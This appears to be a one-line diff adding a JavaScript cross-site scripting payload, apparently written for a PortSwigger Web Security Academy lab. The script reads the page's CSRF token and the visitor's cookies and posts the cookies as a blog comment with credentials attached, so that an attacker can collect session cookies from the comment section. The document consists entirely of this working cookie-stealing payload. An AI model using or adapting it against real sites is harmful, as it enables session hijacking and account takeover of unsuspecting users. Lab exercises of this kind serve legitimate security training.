@@ -1,0 +1,1 @@
+var http = new XMLHttpRequest();http.open('post','https://0af300ea03a9543a80466c29008a0019.web-security-academy.net/post/comment');http.withCredentials = true;http.send("csrf="+document.getElementsByName("csrf")[0].value+"&postId=7&comment="+document.cookie.replace("=", "")+"&name=name&email=email%40email.com");
